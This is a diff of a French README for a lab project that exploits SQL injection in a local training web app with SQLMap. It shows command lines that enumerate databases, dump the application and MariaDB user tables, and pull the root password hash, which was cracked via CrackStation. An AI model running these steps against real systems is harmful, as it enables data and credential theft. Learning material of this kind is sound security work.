@@ -1,8 +1,9 @@
+
 # Projet : Exploitation SQL Injection avec SQLMap
 
 ## Description
 
-Ce projet explore l'exploitation de vulnérabilités SQL Injection sur une application web locale. L’outil **SQLMap** a permis d’identifier plusieurs types de failles SQL Injection, et d’extraire des informations sensibles de la base de données, notamment les utilisateurs et les privilèges.
+Ce projet explore l'exploitation de vulnérabilités SQL Injection sur une application web locale. L’outil **SQLMap** a permis d’identifier plusieurs types de failles SQL Injection et d’extraire des informations sensibles de la base de données, notamment les utilisateurs et les privilèges.
 
 ### Identification de la base de données et vulnérabilités SQL Injection
 
@@ -35,7 +36,7 @@ Ces vulnérabilités ont confirmé la possibilité d'exploiter les injections SQ
 1. Effectuer un dump du schéma de la base de données.
 2. Récupérer la liste des utilisateurs de l'application.
 3. Récupérer la liste des utilisateurs de MariaDB.
-4. Obtenir et déchiffrer le mot de passe root de MariaDB via attaque par force brute.
+4. Obtenir et déchiffrer le mot de passe root de MariaDB via une attaque par force brute.
 5. Extraire le mot de passe administrateur de l'application.
 
 ---
@@ -75,33 +76,56 @@ Voici un aperçu des commandes SQLMap exécutées pour chaque objectif :
 sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" --level=2 --risk=3 --batch
 ```
 
-### 2. Extraction du Schéma de la Base de Données
+### 2. Extraction des Bases de Données Disponibles
+
+**Commande :**
+```bash
+sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" --dbs --batch
+```
+
+### 3. Récupération du Schéma de la Base de Données `sqlitraining`
 
 **Commande :**
 ```bash
 sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining --tables --batch
 ```
 
-**Extraction des tables dans `information_schema` :**
+### 4. Récupération des Tables de `information_schema`
+
+**Commande :**
 ```bash
 sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D information_schema --tables --batch
 ```
 
-### 3. Récupération des Utilisateurs de l'Application
+### 5. Extraction des Données de la Table `users` dans `sqlitraining`
 
 **Commande :**
 ```bash
-sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --batch --dump-format=CSV
+sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --dump-format=CSV --batch
 ```
 
-### 4. Récupération des Utilisateurs de MariaDB
+### 6. Extraction des Données de la Table `products` dans `sqlitraining`
+
+**Commande :**
+```bash
+sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T products --dump --dump-format=CSV --batch
+```
+
+### 7. Récupération des Tables dans la Base `mysql`
+
+**Commande :**
+```bash
+sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql --tables --batch
+```
+
+### 8. Extraction des Données de la Table `user` dans `mysql`
 
 **Commande :**
 ```bash
 sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql -T user --dump --batch --dump-format=CSV
 ```
 
-### 5. Extraction du Mot de Passe root de MariaDB
+### 9. Extraction des Données Précises (User, Host, authentication_string) dans la Table `user` pour l’utilisateur `root`
 
 **Commande :**
 ```bash
@@ -110,7 +134,7 @@ sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&na
 
 - **Détails** : Le mot de passe obtenu, `81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`, correspond à **root** après décryptage sur **CrackStation**. Ce mot de passe était encodé en MySQL4.1+.
 
-### 6. Extraction du Mot de Passe Administrateur de l'Application
+### 10. Extraction du Mot de Passe Administrateur de l'Application
 
 **Commande :**
 ```bash
@@ -122,3 +146,5 @@ sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&na
 ### Notes Légales
 
 L'utilisation de **SQLMap** pour des attaques sans autorisation préalable est illégale. Ce projet est réalisé dans un cadre d'apprentissage sécurisé et contrôlé.
+
+---
